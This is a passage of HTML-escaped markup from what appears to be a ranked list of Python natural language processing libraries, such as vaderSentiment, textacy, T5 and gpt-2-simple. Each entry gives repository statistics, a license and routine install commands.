width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/pytext&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 230 · 🔀 800 · 📥 290 · 📦 110 · 📋 220 - 66% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/pytext&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytext-nlp&#34;&gt;PyPi&lt;/a&gt; (📥 320 / month · 📦 1 · ⏱️ 08.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytext-nlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/cjhutto/vaderSentiment&#34;&gt;vaderSentiment&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 3.6K) - VADER Sentiment Analysis. VADER (Valence Aware Dictionary and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/cjhutto/vaderSentiment&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 860 · 📦 3.8K · 📋 110 - 30% open · ⏱️ 01.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/cjhutto/vaderSentiment&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/vadersentiment&#34;&gt;PyPi&lt;/a&gt; (📥 190K / month · 📦 170 · ⏱️ 22.05.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install vadersentiment&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/vadersentiment&#34;&gt;Conda&lt;/a&gt; (📥 8.6K · ⏱️ 22.03.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge vadersentiment&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/life4/textdistance&#34;&gt;TextDistance&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.8K) - Compute distance between sequences. 30+ algorithms, pure python.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/life4/textdistance&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 230 · 📥 650 · 📦 2.2K · ⏱️ 29.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/life4/textdistance&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/textdistance&#34;&gt;PyPi&lt;/a&gt; (📥 520K / month · 📦 39 · ⏱️ 27.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install textdistance&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/textdistance&#34;&gt;Conda&lt;/a&gt; (📥 110K · ⏱️ 27.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge textdistance&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/huggingface/neuralcoref&#34;&gt;neuralcoref&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.5K · 💤) - Fast Coreference Resolution in spaCy with Neural Networks. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/huggingface/neuralcoref&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 440 · 📥 400 · 📦 490 · 📋 300 - 16% open · ⏱️ 22.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/huggingface/neuralcoref&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/neuralcoref&#34;&gt;PyPi&lt;/a&gt; (📥 100K / month · 📦 14 · ⏱️ 08.04.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install neuralcoref&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/neuralcoref&#34;&gt;Conda&lt;/a&gt; (📥 11K · ⏱️ 21.02.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge neuralcoref&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dmlc/gluon-nlp&#34;&gt;GluonNLP&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.4K · 💤) - Toolkit that enables easy text preprocessing, datasets.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1X&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dmlc/gluon-nlp&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 82 · 🔀 520 · 📦 810 · 📋 560 - 46% open · ⏱️ 24.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dmlc/gluon-nlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gluonnlp&#34;&gt;PyPi&lt;/a&gt; (📥 47K / month · 📦 22 · ⏱️ 13.08.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install gluonnlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/chartbeat-labs/textacy&#34;&gt;textacy&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 1.9K) - NLP, before and after spaCy. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/chartbeat-labs/textacy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 32 · 🔀 230 · 📋 250 - 11% open · ⏱️ 06.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/chartbeat-labs/textacy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/textacy&#34;&gt;PyPi&lt;/a&gt; (📥 43K / month · 📦 100 · ⏱️ 06.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install textacy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/textacy&#34;&gt;Conda&lt;/a&gt; (📥 110K · ⏱️ 06.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge textacy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/DerwenAI/pytextrank&#34;&gt;PyTextRank&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 1.8K) - Python implementation of TextRank algorithms (textgraphs) for phrase.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/DerwenAI/pytextrank&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 330 · 📦 260 · 📋 86 - 29% open · ⏱️ 07.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/DerwenAI/pytextrank&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytextrank&#34;&gt;PyPi&lt;/a&gt; (📥 20K / month · 📦 13 · ⏱️ 06.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytextrank&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/cltk/cltk&#34;&gt;CLTK&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 720) - The Classical Language Toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/cltk/cltk&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 310 · 📥 25 · 📦 200 · 📋 520 - 4% open · ⏱️ 01.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/cltk/cltk&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/cltk&#34;&gt;PyPi&lt;/a&gt; (📥 1.9K / month · 📦 42 · ⏱️ 26.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install cltk&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Ciphey/Ciphey&#34;&gt;Ciphey&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 9.9K) - Automatically decrypt encryptions without knowing the key or cipher,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Ciphey/Ciphey&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 46 · 🔀 610 · 📋 290 - 17% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Ciphey/Ciphey&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ciphey&#34;&gt;PyPi&lt;/a&gt; (📥 17K / month · ⏱️ 06.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ciphey&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/remnux/ciphey&#34;&gt;Docker Hub&lt;/a&gt; (📥 15K · ⭐ 7 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull remnux/ciphey&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google-research/text-to-text-transfer-transformer&#34;&gt;T5&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 4.2K) - Code for the paper Exploring the Limits of Transfer Learning with a.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google-research/text-to-text-transfer-transformer&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 48 · 🔀 570 · 📦 99 · 📋 400 - 15% open · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google-research/text-to-text-transfer-transformer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/t5&#34;&gt;PyPi&lt;/a&gt; (📥 7.9K / month · 📦 2 · ⏱️ 18.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install t5&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/fastnlp/fastNLP&#34;&gt;fastNLP&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 2.6K) - fastNLP: A Modularized and Extensible NLP Framework. Currently still.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/fastnlp/fastNLP&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 54 · 🔀 420 · 📥 66 · 📦 79 · 📋 200 - 23% open · ⏱️ 06.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/fastnlp/fastNLP&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fastnlp&#34;&gt;PyPi&lt;/a&gt; (📥 1.3K / month · 📦 3 · ⏱️ 04.02.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fastnlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/explosion/spacy-transformers&#34;&gt;spacy-transformers&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 1.1K) - Use pretrained transformers like BERT, XLNet and GPT-2.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;spacy&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/explosion/spacy-transformers&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 140 · 📦 510 · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/explosion/spacy-transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/spacy-transformers&#34;&gt;PyPi&lt;/a&gt; (📥 99K / month · 📦 17 · ⏱️ 15.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install spacy-transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/spacy-transformers&#34;&gt;Conda&lt;/a&gt; (📥 1.3K · ⏱️ 15.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge spacy-transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dwyl/english-words&#34;&gt;english-words&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 7.1K) - A text file containing 479k English words for all your.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rvuUlR&#34;&gt;Unlicense&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dwyl/english-words&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 1.4K · 📋 92 - 68% open · ⏱️ 20.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dwyl/english-words&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/english-words&#34;&gt;PyPi&lt;/a&gt; (📥 16K / month · 📦 6 · ⏱️ 29.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install english-words&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/snipsco/snips-nlu&#34;&gt;Snips NLU&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 3.7K · 💤) - Snips Python library to extract meaning from text. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/snipsco/snips-nlu&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 22 · 🔀 500 · 📋 260 - 23% open · ⏱️ 03.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/snipsco/snips-nlu&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/snips-nlu&#34;&gt;PyPi&lt;/a&gt; (📥 2.9K / month · 📦 11 · ⏱️ 15.01.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install snips-nlu&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/JasonKessler/scattertext&#34;&gt;scattertext&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 1.8K) - Beautiful visualizations of how language differs among document.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/JasonKessler/scattertext&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 250 · 📦 280 · 📋 87 - 19% open · ⏱️ 26.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/JasonKessler/scattertext&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/scattertext&#34;&gt;PyPi&lt;/a&gt; (📥 4.2K / month · 📦 10 · ⏱️ 26.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install scattertext&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/scattertext&#34;&gt;Conda&lt;/a&gt; (📥 61K · ⏱️ 26.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge scattertext&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/NTMC-Community/MatchZoo&#34;&gt;MatchZoo&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 3.7K · 💤) - Facilitating the design, comparison and sharing of deep.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/NTMC-Community/MatchZoo&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 36 · 🔀 910 · 📦 10 · 📋 460 - 6% open · ⏱️ 02.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/NTMC-Community/MatchZoo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/matchzoo&#34;&gt;PyPi&lt;/a&gt; (📥 94 / month · ⏱️ 24.10.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install matchzoo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PetrochukM/PyTorch-NLP&#34;&gt;pytorch-nlp&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 2.1K · 💤) - Basic Utilities for PyTorch Natural Language Processing.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PetrochukM/PyTorch-NLP&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 250 · 📦 380 · 📋 67 - 26% open · ⏱️ 10.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PetrochukM/PyTorch-NLP&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorch-nlp&#34;&gt;PyPi&lt;/a&gt; (📥 6.7K / month · 📦 17 · ⏱️ 04.11.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorch-nlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/utterworks/fast-bert&#34;&gt;fast-bert&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1.7K) - Super easy library for BERT based NLP models. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/utterworks/fast-bert&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 36 · 🔀 330 · 📋 250 - 61% open · ⏱️ 12.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/utterworks/fast-bert&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fast-bert&#34;&gt;PyPi&lt;/a&gt; (📥 1.9K / month · 📦 2 · ⏱️ 12.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fast-bert&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/minimaxir/gpt-2-simple&#34;&gt;gpt-2-simple&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 2.9K · 📈) - Python package to easily retrain OpenAIs GPT-2 text-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/minimaxir/gpt-2-simple&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 590 · 📥 300 · 📋 250 - 61% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/minimaxir/gpt-2-simple&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gpt-2-simple&#34;&gt;PyPi&lt;/a&gt; (📥 5.6K / month · 📦 5 · ⏱️ 18.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install gpt-2-simple&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/BrikerMan/Kashgari&#34;&gt;Kashgari&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 2.3K · 💤) - Kashgari is a production-level NLP Transfer learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/BrikerMan/Kashgari&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 430 · 📦 52 · 📋 370 - 10% open · ⏱️ 09.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/BrikerMan/Kashgari&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/kashgari-tf&#34;&gt;PyPi&lt;/a&gt; (📥 66 / month · 📦 2 · ⏱️ 18.10.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install kashgari-tf&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/explosion/sense2vec&#34;&gt;sense2vec&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.4K · 💤) - Contextually-keyed word vectors. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/explosion/sense2vec&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 230 · 📥 30K · 📦 140 · 📋 110 - 18% open · ⏱️ 